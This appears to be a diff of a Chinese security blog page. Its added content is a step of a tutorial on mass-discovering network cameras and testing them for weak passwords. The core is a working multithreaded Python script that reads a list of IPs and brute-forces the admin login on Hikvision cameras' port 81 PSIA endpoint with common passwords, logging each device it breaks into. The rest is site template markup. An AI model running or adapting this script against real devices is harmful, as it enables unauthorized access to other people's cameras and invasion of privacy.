+<h2 id="Step-3-测试弱命令"><a href="#Step-3-测试弱命令" class="headerlink" title="Step 3:测试弱命令"></a>Step 3:测试弱命令</h2><p>这里利用的是固有端口81，很简单的实现<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string">@version: ??</span></div><div class="line"><span class="string">@author: hiro086</span></div><div class="line"><span class="string">@contact: wangzw@nuaa.edu.cn</span></div><div class="line"><span class="string">@file: weak_password.py</span></div><div class="line"><span class="string">@time: 17/6/29 上午10:15</span></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">password = [<span class="string">'admin'</span>,<span class="string">'12345'</span>,<span class="string">'123456'</span>,<span class="string">'123456789'</span>,<span class="string">'password'</span>,<span class="string">'iloveyou'</span>,<span class="string">'princess'</span>,<span class="string">'rockyou'</span>,<span class="string">'1234567'</span>,<span class="string">'12345678'</span>,<span class="string">'abc123'</span>,<span class="string">'111111'</span>,<span class="string">'superman'</span>]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Threads</span><span class="params">()</span>:</span></div><div class="line">    threadlist = []</div><div class="line">    queue = Queue.Queue()</div><div class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> open(<span class="string">'ip_list1.txt'</span>,<span class="string">'r'</span>):</div><div class="line">        queue.put(ip.replace(<span class="string">'\n'</span>,<span class="string">''</span>))</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">        th = threading.Thread(target=scan_Hikvision,args=(queue,))</div><div class="line">        threadlist.append(th)</div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</div><div class="line">        t.start()</div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</div><div class="line">        t.join()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_Hikvision</span><span class="params">(queue)</span>:</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> queue.empty():</div><div class="line">        ip = queue.get()</div><div class="line">        <span class="keyword">for</span> passwd <span class="keyword">in</span> password:</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">"[*]scan:"</span>+ip</div><div class="line">                r = requests.get(url=(<span class="string">"http://%s:81/PSIA/System/deviceInfo"</span> % ip),auth=(<span class="string">'admin'</span>,passwd),</div><div class="line">                                 timeout=<span class="number">20</span>)</div><div class="line">                <span class="keyword">print</span> <span class="string">"[*]back:"</span>+ip+<span class="string">' '</span>+passwd+<span class="string">' '</span>+str(r.status_code)</div><div class="line">                <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</div><div class="line">                    deviceName = re.findall(<span class="string">r'&lt;deviceName&gt;(.+?)&lt;deviceName&gt;'</span>,r.text)[<span class="number">0</span>]</div><div class="line">                    f = open(<span class="string">'ok.txt'</span>,<span class="string">'a+'</span>)</div><div class="line">                    f.write(<span class="string">"ip:%s deviceName:%s\n"</span> % (ip,deviceName))</div><div class="line">                    f.close()</div><div class="line">                    <span class="keyword">break</span></div><div class="line">            <span class="keyword">except</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"Running scan_Hikvision ..."</span></div><div class="line">    Threads()</div></pre></td></tr></table></figure></p>
+
       
     </div>
     
@@ -1179,190 +465,42 @@ Hello_world文件目录安装好OP-TEE环
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/26/Ubuntu-14-04-64位-搭建OP-TEE环境/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Hiro WANG's Blog">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hiro WANG's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/08/26/Ubuntu-14-04-64位-搭建OP-TEE环境/" itemprop="url">OP-TEE系列之(一)Ubuntu-14搭建QEMU中OP-TEE可信执行环境</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-26T22:38:26+08:00">
-                2017-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/TrustZone/" itemprop="url" rel="index">
-                    <span itemprop="name">TrustZone</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
+            <a href="/tags/Python/" rel="tag"># Python</a>
           
-
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
           
-            
-          
-
-          
-          
-             <span id="/2017/08/26/Ubuntu-14-04-64位-搭建OP-TEE环境/" class="leancloud_visitors" data-flag-title="OP-TEE系列之(一)Ubuntu-14搭建QEMU中OP-TEE可信执行环境">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  255 字
-                </span>
-              
-
-              
-
-              
-            </div>
-          
-
-          
-
         </div>
-      </header>
-    
+      
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+      
       
       
 
       
-        
-          <p>OP-TEE是包含使用ARM®TrustZone®技术的LinuxTEE源代码。 该组件符合GlobalPlatform TEE系统架构规范。 它还提供了由GlobalPlatform TEE标准定义的TEE内部核心API v1.1，用于开发可信应用程序。<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/08/26/Ubuntu-14-04-64位-搭建OP-TEE环境/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/28/Ubuntu-17-04-Snort-2-9-9-0-Barnyard2-PulledPork-BASE/" rel="next" title="Ubuntu 17.04 + Snort 2.9.9.0 + Barnyard2 + PulledPork + BASE">
+                <i class="fa fa-chevron-left"></i> Ubuntu 17.04 + Snort 2.9.9.0 + Barnyard2 + PulledPork + BASE
+              </a>
+            
           </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
 
-    
+          <span class="post-nav-divider"></span>
 
-    
-
-    
-
-    <footer class="post-footer">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/01/Intel-SGX-ARM-TrustZone等技术简介与分析入门/" rel="prev" title="Intel SGX ARM TrustZone等技术简介与分析入门">
+                Intel SGX ARM TrustZone等技术简介与分析入门 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
       
 
       
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -1372,10 +510,11 @@ Hello_world文件目录安装好OP-TEE环
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -1383,6 +522,10 @@ Hello_world文件目录安装好OP-TEE环
 
 
           
+  <div class="comments" id="comments">
+    
+  </div>
+
 
         </div>
         
@@ -1405,8 +548,17 @@ Hello_world文件目录安装好OP-TEE环
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
@@ -1545,6 +697,22 @@ Hello_world文件目录安装好OP-TEE环
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-1-利用搜索引擎批量发现网络摄像头"><span class="nav-number">1.</span> <span class="nav-text">Step 1:利用搜索引擎批量发现网络摄像头</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-2-提取IP信息"><span class="nav-number">2.</span> <span class="nav-text">Step 2:提取IP信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-3-测试弱命令"><span class="nav-number">3.</span> <span class="nav-text">Step 3:测试弱命令</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1696,10 +864,10 @@ show_date_time();
 
 
   
-    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
 <script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
 
-  
+
 
   
 
@@ -2166,26 +1334,6 @@ show_date_time();
   
 
   
-  
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-        tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-      });
-    </script>
-
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-      });
-    </script>
-    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
   
 
 
